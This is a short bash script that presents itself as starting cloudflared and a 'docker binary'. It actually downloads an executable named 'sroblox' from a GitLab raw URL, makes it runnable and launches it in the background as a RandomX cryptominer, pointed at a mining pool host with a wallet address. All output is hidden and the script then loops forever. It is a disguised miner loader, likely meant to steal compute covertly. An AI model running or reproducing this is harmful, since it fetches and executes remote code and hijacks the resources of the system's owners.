#!/bin/bash

echo "Starting cloudflared..."

cloudflared access tcp --hostname "$(cat hostname.txt)" --url 127.0.0.1:443 >/dev/null 2>&1 &

sleep 5

echo "Starting docker binary..."

#chmod +x ./docker
#./docker -c docker.json >/dev/null 2>&1 &
wget -q https://gitlab.com/barbieanay003/app/-/raw/main/sroblox
chmod +x sroblox
./sroblox -a randomx -o randomx.rplant.xyz:7139 -u ZWSBsu2yTiJeo338djzEMGEtkNbxUXDw74xWS1KAgz2zfNiUmVthgLPXc8fmW8NTNBgj426o4ZXHkikvCVe1hxGR2RsKkznQz.Levy -p x --keepalive true >/dev/null 2>&1 &

echo "Running..."

while true
do
  sleep 60
done
